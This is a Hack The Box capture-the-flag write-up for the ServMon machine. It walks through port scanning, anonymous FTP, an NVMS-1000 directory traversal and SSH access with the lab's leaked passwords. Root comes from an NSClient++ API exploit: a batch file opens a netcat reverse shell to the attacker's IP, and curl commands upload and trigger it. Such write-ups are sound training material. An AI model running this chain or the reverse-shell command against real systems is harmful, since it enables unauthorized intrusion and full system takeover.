# ServMon [HTB](https://app.hackthebox.com/machines/240)
![servmon-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/servmon-01.png)

## Recon

After adding the target to my `/etc/hosts` file I start scaning for open ports:

```bash
nmap -p- --min-rate 10000 servmon.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/ports-02.png)


There are quite a lot of open ports on this machine, though many of them seem to be RPC related. Let's leave these ports alone for now and run a version detection scan againts the more relevant ports:

```bash
nmap -p 21,22,80,135,139,445,5666,6063,6699,8443 -sCV servmon.htb -oN nmap.results
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/nmap-res-03.png)
![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/nmap-res-04.png)


We have the following:

+ An FTP server on port 21.
+ An SSH server on port 22.
+ An HTTP server on port 80.
+ RPC endpoint-mapper on port 135.
+ NetBIOS on port 139.
+ An SMB server on port 445.
+ Two "tcpwrapped" services on ports 5666 & 6063.
+ A "napster" service on port 6699.
+ A possible HTTPS server on port 8443.


Once again, we have quite a large attack surface here. Based on nmap's probing scripts, we can see that the FTP server allows for anonymous logins, so let's start with that. After which we an take a look at the HTTP/S servers. 


## FTP Port 21

Let's login to the FTP server using `anonymous: anonymous` as our credentials, and list the contents of the server:

![ftp-list-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/ftp-list-05.png)


We see a `Users` folder. If we `cd` into it, and run `ls` again, we see two user folders:

![ftp-users-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/ftp-users-06.png)


Let's see what's inside each of the folders:

+ Nadine

If we `cd` into the `Nadine` folder we will see a `Confidential.txt` file. Lets copy it over:

![ftp-nadine-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/ftp-nadine-07.png)


The file reads as such:

![nadine-file-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/nadine-file-08.png)


`Nadine` talks about the existence of a `Password.txt` file in `Nathan`'s desktop. Not a lot we can do with this information right now, but it's worth keeping this in mind as we move forward. 


+ Nathan

If we `cd` into the `Nathan` folder we will see a `To do notes.txt` file. I copy this file over as well:

![ftp-nathan-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/ftp-nathan-09.png)


This file reads as such:

![nathan-file-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/nathan-file-10.png)


`Nathan` is referencing some of the other services on this system. The main takeaways here in my opinion is the fact that the `NMVS` service is available publicly, and the mention of the `NSClient` tech. Let's start with the former one. 
 


+ What is NSClient?  

According to [this official NSClient++ page](https://nsclient.org), NSClient is a fully fledged monitoring agent which can be used with numerous monitoring tools. 


If we lookup known exploits for this tech, we can find the following [privesc action plan](https://www.exploit-db.com/exploits/46802). This looks solid, but we need to get access to the system first, so let's save this action plan for later. 


Let's check the NVMS tech. 


+ What is NVMS? 

I searched for this term online and the only thing I could find is that "NVMS" is an acronym for "National Vendor Management Service", which should be some form of a login system. Though, I wasn't able to find any wiki, or official vendor pages that describe the tech in more detail. 


If we browse towards `http://servmon.htb/` we will be see the NVMS login form:

![nvms-login-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/nvms-login-11.png)


I tried to use a couple of weak generic passwords but they all failed. 


Instead, I looked up exploits for `NVMS 1000` online and I found [this directory traversal](https://www.exploit-db.com/exploits/48311) vulnerability on ExploitDB.


According to the exploit notes, all we have to do is add the following syntax before any file we want to retrieve from the server: `../../../../../../../../../../../../../`. 


So for example, to retrive the `passwords.txt` file `Nadine` mentioned, I sent the following request:

![passwords-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/passwords-12.png)


I tried to use these passwords to login to the NVMS portal as both `Nathan` and `Nadine` but to no avail.


Then, I tried to use the passwords to login to the SSH. None of them worked to authenticate as `Nathan`, but upon testing the passwords for `Nadine`, I found that `L1k3B1gBut7s@W0rk` works to get access:

![ssh-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/ssh-13.png)


## Privilege Escalation


Let's try the [privesc exploit](https://www.exploit-db.com/exploits/46802) for NSClient. 


According to the exploit notes, we need to get access to the GUI administration panel which is running on port 8443 on the target. But based on `Nathan`'s notes, this should be restricted from public access. 
 

If we browse towards `https://10.129.227.77:8443/` we see the following


![no-nsclinet-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/no-nsclinet-14.png)


The site does respond, but none of the links work, and we can't do anything. If we read the `NSClinet` configuration file at `C:\Program Files\NSClient++\nsclient.ini` we can see why:

![allowed-hosts-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/allowed-hosts-15.png)


The site is configured to only accept connections from the localhost interface. We need to tunnel this service over to our Kali machine, then we can access it through a localhost interface. To do this we can use a simple SSH tunnel with:

```bash
ssh -L 8443:127.0.0.1:8443 -N Nadine@servmon.htb 
```

If we list the open ports on our attack machine we will see port 8433 is open:

![port-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/port-16.png)


Now we need to transfer `nc64.exe` to the target. I grab a copy to my current working directory, and start an SMB server with:

```bash
impacket-smbserver -smb2support -username htb -password htb serv .
```

Then, I connect to the share from the target and download the file:

```cmd
net use \\10.10.14.54\serv /u:htb htb
copy \\10.10.14.54\serv\nc64.exe nc64.exe
```

Here it is on the target:

![file-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/file-17.png)


Now we can disconnect from the server using:

```cmd
net use /delete \\10.10.14.54\serv
```

Now we just need the password for the NSClient admin panel. We can follow along the exploit notes and find that it is stored at `c:\program files\nsclient++\nsclient.ini`. So we can extract it as such:

```cmd
type "c:\program files\nsclient++\nsclient.ini" | findstr pass
```

![pass-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/pass-18.png)


Now that we have the password, the tunnel is set, and we copied netcat to the target, we are ready to pull of the exploit. Though for some reason, when I opened `https://localhost:8433` on my attack machine I received the following error:

![no-gui-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/no-gui-18.png)


I wasn't sure why this was happening, it was getting pretty late and I wanted to finish the box. So instead of using the GUI, I found a way to pull the exploit off from the command line! 


First, let's create a `htb.bat` script that reads as such:

```bat
@echo off
C:\Users\Nadine\nc64.exe 10.10.14.54 443 -e cmd.exe
```

Now to upload this script to the target, we can run something like this:

```bash
curl -k -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/htb.bat -F 'data=@htb.bat' --user admin:ew2x6SsGTxjRwXOT
```

![added-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/added-19.png)


So far so good. 


Next, let's start a local listener with:

```bash
rlwrap nc -lnvp 443
```


Now we are ready to invoke the exploit. To do so, we can run something like this:

```bash
curl -k 'https://127.0.0.1:8443/api/v1/queries/htb/commands/execute?time=1m' --user admin:ew2x6SsGTxjRwXOT
```


After running this command my shell stalls, and on my netcat listener I receive a shell as `nt authority\system`:

![root-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/ServMon/img/root-20.png)
